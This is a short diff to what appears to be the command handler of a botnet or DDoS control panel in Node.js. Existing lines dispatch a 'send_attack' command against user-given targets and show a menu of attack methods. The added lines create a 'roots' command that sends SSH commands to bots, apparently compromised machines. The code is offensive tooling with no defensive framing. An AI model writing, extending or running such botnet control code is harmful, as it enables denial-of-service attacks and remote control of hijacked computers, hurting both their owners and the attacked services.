@@ -125,6 +125,8 @@ Server.svr.on('connection', async function(socket) {
             socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
         } else if(eConfig.CurrentCmd.Cmd === "methods") {
             socket.write(Config.Colors.Clear + Banners.main_b() + Banners.methods() + Config.hostname(Current[0]));
+        } else if(eConfig.CurrentCmd.Cmd === "roots") {
+            socket.write(bots.SendSSHCmd(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
         } else if(eConfig.CurrentCmd.Cmd === "admin") {
             /*
             *       ADMIN SECTION 
